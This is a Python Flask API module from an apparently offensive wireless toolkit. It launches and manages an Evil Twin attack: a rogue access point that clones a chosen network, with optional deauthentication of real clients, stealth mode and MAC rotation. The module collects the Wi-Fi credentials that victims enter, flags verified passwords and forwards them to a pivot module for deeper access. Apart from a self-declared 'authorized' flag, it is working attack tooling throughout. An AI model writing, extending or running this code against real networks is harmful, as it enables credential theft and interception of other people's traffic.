#!/usr/bin/env python3
"""Snake Evil Twin API."""
import os
import threading
import time

from flask import Blueprint, jsonify, request

from snakefw.core.ap_support import plan_ap_channel
from snakefw.core.radios import assign_roles, conflicts_with_scanner
from snakefw.core.session_manager import get_session
from snakefw.core.tool_manager import (
    check_tools,
    classify_wireless_ifaces,
    get_interface_mode,
    is_valid_bssid,
    normalize_bssid,
)
from snakefw.eviltwin.engine import EvilTwinSession, stop_all_twin, twin_busy_ifaces
from snakefw.pivot.routes import emit_pivot_ready
from snakefw.rf.engine import busy_ifaces as rf_busy_ifaces
from snakefw.rf.engine import rf_tool_ready, stop_all_rf

twin_bp = Blueprint("eviltwin", __name__)

_socketio = None
_snake_log_cb = None
_job_hooks = {}
_session = None
_session_lock = threading.Lock()


def register_socketio(sio, log_cb=None, job_hooks=None):
    global _socketio, _snake_log_cb, _job_hooks
    _socketio = sio
    _snake_log_cb = log_cb
    _job_hooks = job_hooks or {}


def emit_twin(event: str, data: dict):
    if _socketio:
        _socketio.emit(f"twin_{event}", data)


def _on_twin_cred(cred: dict):
    emit_twin("cred", cred)
    if cred.get("verified") and cred.get("password"):
        emit_pivot_ready({
            "essid": cred.get("essid") or "",
            "bssid": cred.get("bssid") or "",
            "key": cred.get("password"),
            "source": "twin",
        })


def log(msg: str, level: str = "INFO"):
    if _snake_log_cb:
        _snake_log_cb(msg, level)
    emit_twin("log", {"ts": time.time(), "level": level, "msg": msg})


def active_twin_ifaces() -> set:
    return twin_busy_ifaces()


def _scanner_iface() -> str:
    getter = _job_hooks.get("scanner_iface")
    return getter() if getter else ""


def _stop_scan(reason: str = "twin") -> bool:
    stopper = _job_hooks.get("stop_scan")
    if not stopper:
        return False
    return bool(stopper(reason))


def _bounded_int(value, default: int, minimum: int, maximum: int) -> int:
    try:
        parsed = int(value)
    except (TypeError, ValueError):
        parsed = default
    return max(minimum, min(maximum, parsed))


def _auto_radios(ap_iface: str = "", deauth_iface: str = "") -> dict:
    session = get_session()
    return assign_roles(
        classify_wireless_ifaces(),
        preferred_ap=ap_iface,
        preferred_deauth=deauth_iface,
        session_monitor=session.monitor_iface,
    )


def _twin_readiness(ap_iface: str = "", deauth_iface: str = "", channel: int = 0) -> dict:
    radios = _auto_radios(ap_iface, deauth_iface)
    tools = check_tools()
    ap_mode = get_interface_mode(radios["ap_iface"]) if radios["ap_iface"] else "unknown"
    deauth_mode = get_interface_mode(radios["deauth_iface"]) if radios["deauth_iface"] else "unknown"
    ap_plan = {}
    if radios["ap_iface"] and channel:
        try:
            ap_plan = plan_ap_channel(radios["ap_iface"], channel)
        except (OSError, ValueError):
            ap_plan = {}
    ready = bool(
        os.geteuid() == 0
        and tools.get("hostapd")
        and tools.get("dnsmasq")
        and radios["ap_iface"]
        and (not ap_plan or ap_plan.get("supports_ap"))
    )
    return {
        **radios,
        "ap_mode": ap_mode,
        "deauth_mode": deauth_mode,
        "root": os.geteuid() == 0,
        "hostapd": bool(tools.get("hostapd")),
        "dnsmasq": bool(tools.get("dnsmasq")),
        "rf_ready": rf_tool_ready(),
        "ready": ready,
        "deauth_ready": bool(radios["deauth_iface"] and deauth_mode == "monitor" and rf_tool_ready()),
        "ap_plan": ap_plan,
        "ap_supported": bool(ap_plan.get("supports_ap", True)),
    }


@twin_bp.route("/api/twin/status")
def twin_status():
    with _session_lock:
        snap = _session.snapshot() if _session else {}
    channel = _bounded_int(
        request.args.get("channel") or snap.get("channel") or 0,
        0,
        0,
        196,
    )
    return jsonify({
        "ok": True,
        "session": snap,
        "active": bool(snap.get("running")),
        "readiness": _twin_readiness(
            request.args.get("ap_iface") or snap.get("ap_iface", ""),
            snap.get("deauth_iface", ""),
            channel,
        ),
    })


@twin_bp.route("/api/twin/readiness")
def twin_readiness():
    ap_iface = (request.args.get("ap_iface") or "").strip()
    deauth_iface = (request.args.get("deauth_iface") or "").strip()
    channel = _bounded_int(request.args.get("channel"), 0, 0, 196)
    return jsonify({"ok": True, "readiness": _twin_readiness(ap_iface, deauth_iface, channel)})


@twin_bp.route("/api/twin/start", methods=["POST"])
def twin_start():
    global _session
    data = request.json or {}
    if data.get("authorized") is not True:
        return jsonify({"ok": False, "error": "Confirm you are authorized to test this target"}), 400

    with _session_lock:
        if _session and _session.running:
            return jsonify({"ok": False, "error": "An Evil Twin session is already running"}), 409

    essid = str(data.get("essid") or "").strip()[:128]
    bssid = normalize_bssid(str(data.get("bssid") or ""))
    if not essid:
        return jsonify({"ok": False, "error": "Select a target ESSID from the scanner"}), 400
    if bssid and not is_valid_bssid(bssid):
        return jsonify({"ok": False, "error": "Invalid BSSID"}), 400

    channel = _bounded_int(data.get("channel"), 6, 1, 196)
    radios = _auto_radios(data.get("ap_iface") or "", data.get("deauth_iface") or "")
    readiness = _twin_readiness(radios["ap_iface"], radios["deauth_iface"], channel)
    if not readiness["ready"]:
        missing = []
        if not readiness["root"]:
            missing.append("root")
        if not readiness["hostapd"]:
            missing.append("hostapd")
        if not readiness["dnsmasq"]:
            missing.append("dnsmasq")
        if not radios["ap_iface"]:
            missing.append("wireless AP interface")
        if readiness.get("ap_plan") and not readiness["ap_plan"].get("supports_ap"):
            missing.append("AP-capable radio")
        return jsonify({
            "ok": False,
            "error": "Twin is not ready: " + ", ".join(missing),
            "readiness": readiness,
        }), 400
    plan = readiness.get("ap_plan") or {}
    if plan.get("channel") and int(plan["channel"]) != channel:
        log(f"[Twin] will AP on ch{plan['channel']} instead of target ch{channel}")

    busy = rf_busy_ifaces()
    scanner = _scanner_iface()
    classified = {"interfaces": radios.get("interfaces") or []}
    conflict_ifaces = {
        name for name in (radios["ap_iface"], radios["deauth_iface"]) if name
    }
    if conflict_ifaces & busy:
        stop_all_rf()
        log("[Twin] stopped RF on the Twin radio so hostapd can hold the AP")
    if radios["ap_iface"] and conflicts_with_scanner(radios["ap_iface"], scanner, classified):
        if _stop_scan("twin"):
            log("[Twin] stopped scan on the Twin radio so hostapd can hold the AP")
        else:
            return jsonify({
                "ok": False,
                "error": f"{radios['ap_iface']} is the scan radio. Stop the scan or use another adapter for the Twin AP.",
            }), 409
    if radios["deauth_iface"] and conflicts_with_scanner(radios["deauth_iface"], scanner, classified):
        if not _stop_scan("twin"):
            return jsonify({
                "ok": False,
                "error": f"{radios['deauth_iface']} is the scan radio. Use the attack radio or stop the scan.",
            }), 409

    session = get_session()
    network = None
    for item in session.networks:
        if bssid and normalize_bssid(item.get("bssid", "")) == bssid:
            network = item
            break
        if not bssid and (item.get("essid") or "").strip().lower() == essid.lower():
            network = item
            break
    encryption = str(data.get("encryption") or (network or {}).get("encryption") or "")

    twin = EvilTwinSession(
        essid=essid,
        bssid=bssid,
        channel=channel,
        ap_iface=radios["ap_iface"],
        deauth_iface=radios["deauth_iface"],
        verify_iface=radios["verify_iface"],
        encryption=encryption,
        stealth=bool(data.get("stealth")),
        rotate_mac=bool(data.get("rotate_mac")),
        on_log=lambda msg: log(msg),
        on_cred=_on_twin_cred,
        on_client=lambda clients: emit_twin("clients", {"clients": clients}),
    )

    def _run():
        global _session
        try:
            twin.start()
            session_state = get_session()
            session_state.interface = twin.ap_iface
            if session_state.monitor_iface and session_state.monitor_iface not in {
                twin.deauth_iface, twin.verify_iface,
            }:
                session_state.monitor_iface = twin.deauth_iface
            emit_twin("status", twin.snapshot())
        except Exception as exc:
            twin.error = str(exc)
            log(f"[Twin] failed: {exc}", "ERROR")
            twin.stop()
            with _session_lock:
                if _session is twin:
                    _session = None
            emit_twin("status", {"running": False, "error": str(exc)})

    with _session_lock:
        _session = twin
    threading.Thread(target=_run, daemon=True).start()
    time.sleep(0.4)
    log(f"[Twin] launching {essid} ({bssid or 'no BSSID'}) on {radios['ap_iface']}", "ATTACK")
    return jsonify({
        "ok": True,
        "session_id": twin.session_id,
        "readiness": readiness,
        "single_radio": radios["single_radio"],
    })


@twin_bp.route("/api/twin/stop", methods=["POST"])
def twin_stop():
    global _session
    with _session_lock:
        current = _session
        _session = None
    if current:
        current.stop()
    else:
        stop_all_twin()
    emit_twin("status", {"running": False})
    log("[Twin] session stopped", "WARN")
    return jsonify({"ok": True})


@twin_bp.route("/api/twin/clients")
def twin_clients():
    with _session_lock:
        clients = list(_session.clients) if _session else []
    return jsonify({"ok": True, "clients": clients, "count": len(clients)})


@twin_bp.route("/api/twin/creds")
def twin_creds():
    with _session_lock:
        creds = list(_session.creds) if _session else []
    return jsonify({"ok": True, "creds": creds, "count": len(creds)})
